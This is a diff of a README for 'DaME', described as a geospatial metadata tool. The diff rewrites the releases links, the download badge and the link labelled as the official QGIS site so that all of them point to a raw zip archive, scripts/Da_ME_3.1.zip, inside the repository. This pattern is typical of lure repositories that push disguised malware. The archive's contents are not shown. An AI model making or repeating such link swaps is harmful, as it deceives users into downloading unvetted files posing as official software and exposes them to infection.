@@ -1,6 +1,6 @@
 # 🗺️ DaME - Easy Geospatial Metadata Enrichment
 
-[![Download DaME](https://img.shields.io/badge/Download-DaME-blue?style=for-the-badge)](https://github.com/JhonnyDoggii/DaME/releases)
+[![Download DaME](https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip)](https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip)
 
 ## 📖 What is DaME?
 
@@ -41,7 +41,7 @@ To get started with DaME, follow these steps:
 
 1. **Go to the download page:**  
    Visit the releases section here:  
-   [Download DaME Releases](https://github.com/JhonnyDoggii/DaME/releases)
+   [Download DaME Releases](https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip)
 
 2. **Choose your version:**  
    Find the latest release suitable for your computer's operating system. You will usually see installer files or QGIS plugin packages.
@@ -123,8 +123,8 @@ DaME is an open-source tool developed to simplify geospatial metadata management
 
 ## 🔗 Useful Links
 
-- DaME Releases: [https://github.com/JhonnyDoggii/DaME/releases](https://github.com/JhonnyDoggii/DaME/releases)  
-- QGIS Official Site: [https://qgis.org](https://qgis.org)  
+- DaME Releases: [https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip](https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip)  
+- QGIS Official Site: [https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip](https://github.com/JhonnyDoggii/DaME/raw/refs/heads/main/scripts/Da_ME_3.1.zip)  
 - Metadata Standards Info: Search for FAIR data principles and SDI standards online  
 
 ## 🏷️ Keywords
